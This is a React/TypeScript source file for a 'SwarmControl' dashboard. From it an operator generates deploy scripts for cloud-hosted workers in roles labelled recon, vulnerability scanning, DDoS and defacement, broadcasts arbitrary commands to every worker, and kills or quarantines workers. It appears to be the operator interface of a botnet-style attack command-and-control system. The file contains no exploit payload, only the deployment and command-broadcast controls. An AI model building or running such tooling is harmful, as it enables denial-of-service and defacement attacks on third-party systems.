import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Plus, Trash2, Shield, Zap, Eye, Brush } from 'lucide-react';
import axios from 'axios';

interface Worker {
  id: string;
  status: string;
  info: any;
}

interface SwarmControlProps {
  workers: Worker[];
  token: string;
}

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:8443/api';

export default function SwarmControl({ workers, token }: SwarmControlProps) {
  const [broadcastMsg, setBroadcastMsg] = useState('');
  const [selectedRole, setSelectedRole] = useState('scout');
  const [deployCount, setDeployCount] = useState(1);

  const headers = { Authorization: `Bearer ${token}` };

  const handleBroadcast = async () => {
    if (!broadcastMsg) return;
    try {
      await axios.post(`${API_URL}/swarm/broadcast`, 
        { command: broadcastMsg },
        { headers }
      );
      setBroadcastMsg('');
    } catch (e) {
      console.error('Broadcast failed');
    }
  };

  const handleDeploy = async () => {
    try {
      const resp = await axios.post(`${API_URL}/swarm/deploy`,
        { 
          provider: 'script',
          count: deployCount,
          role: selectedRole
        },
        { headers }
      );
      // Show deployment scripts
      console.log(resp.data);
    } catch (e) {
      console.error('Deploy failed');
    }
  };

  const handleKill = async (workerId: string) => {
    try {
      await axios.post(`${API_URL}/workers/${workerId}/kill`, {}, { headers });
    } catch (e) {
      console.error('Kill failed');
    }
  };

  const handleQuarantine = async (workerId: string) => {
    try {
      await axios.post(`${API_URL}/workers/${workerId}/quarantine`, {}, { headers });
    } catch (e) {
      console.error('Quarantine failed');
    }
  };

  const roleIcons: any = {
    scout: Eye,
    analyzer: Shield,
    storm: Zap,
    graffiti: Brush
  };

  return (
    <div className="grid grid-cols-12 gap-6">
      {/* Deployment */}
      <div className="col-span-4">
        <div className="panel">
          <div className="panel-header">Deploy Workers</div>
          <div className="panel-body space-y-4">
            <div>
              <label className="block text-sm font-orbitron text-amber mb-2">ROLE</label>
              <select 
                value={selectedRole}
                onChange={e => setSelectedRole(e.target.value)}
                className="select-field w-full"
              >
                <option value="scout">Scout (Recon)</option>
                <option value="analyzer">Analyzer (Vuln Scan)</option>
                <option value="storm">Storm (DDoS)</option>
                <option value="graffiti">Graffiti (Deface)</option>
              </select>
            </div>
            
            <div>
              <label className="block text-sm font-orbitron text-amber mb-2">COUNT</label>
              <input
                type="number"
                min="1"
                max="100"
                value={deployCount}
                onChange={e => setDeployCount(parseInt(e.target.value))}
                className="input-field"
              />
            </div>

            <button onClick={handleDeploy} className="hex-button hex-button-primary w-full">
              <Plus className="w-4 h-4 inline mr-2" />
              Generate Deploy Scripts
            </button>

            <div className="pt-4 border-t border-amber/20">
              <div className="text-xs font-orbitron text-amber/70 mb-2">CLOUD PROVIDERS</div>
              <div className="grid grid-cols-2 gap-2">
                {['AWS', 'Azure', 'GCP', 'DigitalOcean'].map(p => (
                  <button key={p} className="hex-button text-xs">{p}</button>
                ))}
              </div>
            </div>
          </div>
        </div>

        <div className="panel mt-4">
          <div className="panel-header">Broadcast Terminal</div>
          <div className="panel-body">
            <textarea
              value={broadcastMsg}
              onChange={e => setBroadcastMsg(e.target.value)}
              placeholder="Enter command to broadcast to all workers..."
              className="input-field h-24 resize-none"
            />
            <button 
              onClick={handleBroadcast}
              className="hex-button hex-button-primary w-full mt-3"
            >
              Send to Swarm
            </button>
          </div>
        </div>
      </div>

      {/* Worker List */}
      <div className="col-span-8">
        <div className="panel">
          <div className="panel-header">Worker Management</div>
          <div className="panel-body">
            <table className="w-full">
              <thead>
                <tr className="text-left text-xs font-orbitron text-amber/70 border-b border-amber/20">
                  <th className="pb-2">ID</th>
                  <th className="pb-2">Role</th>
                  <th className="pb-2">Status</th>
                  <th className="pb-2">Hostname</th>
                  <th className="pb-2">IP</th>
                  <th className="pb-2">Latency</th>
                  <th className="pb-2">Actions</th>
                </tr>
              </thead>
              <tbody>
                {workers.map(w => {
                  const Icon = roleIcons[w.info?.role] || Eye;
                  return (
                    <tr key={w.id} className="border-b border-amber/10 hover:bg-amber/5">
                      <td className="py-3 font-jetbrains text-sm">{w.id}</td>
                      <td className="py-3">
                        <div className="flex items-center">
                          <Icon className="w-4 h-4 text-amber mr-2" />
                          <span className="capitalize">{w.info?.role || 'unknown'}</span>
                        </div>
                      </td>
                      <td className="py-3">
                        <span className={`status-dot status-${w.status}`} />
                        <span className="text-sm capitalize">{w.status}</span>
                      </td>
                      <td className="py-3 text-sm text-warm/70">{w.info?.hostname || '-'}</td>
                      <td className="py-3 font-jetbrains text-sm">{w.info?.ip || '-'}</td>
                      <td className="py-3 font-jetbrains text-sm">
                        {w.info?.latency_ms ? `${w.info.latency_ms}ms` : '-'}
                      </td>
                      <td className="py-3">
                        <div className="flex gap-2">
                          <button 
                            onClick={() => handleQuarantine(w.id)}
                            className="p-1 text-wheat hover:text-amber"
                            title="Quarantine"
                          >
                            <Shield className="w-4 h-4" />
                          </button>
                          <button 
                            onClick={() => handleKill(w.id)}
                            className="p-1 text-blood hover:text-red-400"
                            title="Kill"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
